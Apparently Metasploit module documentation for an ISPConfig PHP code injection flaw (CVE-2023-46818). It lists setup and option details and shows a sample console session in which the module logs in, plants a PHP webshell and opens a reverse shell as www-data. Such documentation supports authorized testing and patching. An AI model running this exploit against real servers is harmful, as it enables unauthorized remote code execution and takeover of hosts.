## Vulnerable Application

ISPConfig before 3.2.11p1 is vulnerable to PHP code injection via the language file editor (language_edit.php) if the `admin_allow_langedit` option is enabled. An authenticated administrator can inject arbitrary PHP code, leading to remote code execution on the server.

- Vendor Advisory: https://www.ispconfig.org/
- CVE: [CVE-2023-46818](https://nvd.nist.gov/vuln/detail/CVE-2023-46818)
- PoC/Details: [https://github.com/SyFi/CVE-2023-46818](https://github.com/SyFi/CVE-2023-46818)
- Exploit writeup: [https://karmainsecurity.com/KIS-2023-13](https://karmainsecurity.com/KIS-2023-13)

### Setup Example

1. Download and install ISPConfig (vulnerable version, e.g., 3.2.11 or earlier)
2. Enable `admin_allow_langedit` in the ISPConfig configuration.
3. Create an admin user for testing.

## Verification Steps

1. Start msfconsole
2. Do: `use exploit/linux/http/ispconfig_lang_edit_php_code_injection`
3. Set the `RHOSTS`, `USERNAME`, and `PASSWORD` options
4. Set `TARGETURI` if ISPConfig is not at the web root
5. Run the module
6. You should get a Meterpreter or command shell session as the web server user.

## Options

### USERNAME
The ISPConfig administrator username to authenticate with.

### PASSWORD
The ISPConfig administrator password to authenticate with.

### TARGETURI
The base path to ISPConfig (default: `/`).

### LOGIN_TIMEOUT
Timeout for login request (default: 15 seconds).

### DELETE_SHELL
Whether to delete the webshell after exploitation (default: true).

## Scenarios

### ISPConfig 3.2.11 (or earlier), Ubuntu 20.04

```
msf6 > use exploit/linux/http/ispconfig_lang_edit_php_code_injection
msf6 exploit(linux/http/ispconfig_lang_edit_php_code_injection) > set rhosts 192.168.1.100
rhosts => 192.168.1.100
msf6 exploit(linux/http/ispconfig_lang_edit_php_code_injection) > set username admin
username => admin
msf6 exploit(linux/http/ispconfig_lang_edit_php_code_injection) > set password adminpass
password => adminpass
msf6 exploit(linux/http/ispconfig_lang_edit_php_code_injection) > run

[*] Started reverse TCP handler on 192.168.1.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] ISPConfig installation detected
[*] Attempting login with username 'admin' and password 'adminpass'
[+] Login successful!
[*] Injecting PHP shell...
[+] CSRF tokens extracted: ID=abc123..., KEY=def456...
[+] Shell successfully injected: sh_xxxxx.php
[*] Starting payload handler...
[+] PHP payload triggered
[*] Waiting for session...
[+] Shell responsive: uid=33(www-data) gid=33(www-data) groups=33(www-data)

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uname -a
Linux ubuntu 5.15.0-52-generic #58~20.04.1-Ubuntu SMP Thu Oct 13 13:09:46 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

## Notes
- The module requires valid ISPConfig admin credentials and the `admin_allow_langedit` option enabled.
- The shell is removed after exploitation if `DELETE_SHELL` is true.
- The exploit drops a PHP webshell and triggers the payload for Meterpreter or command shell access. 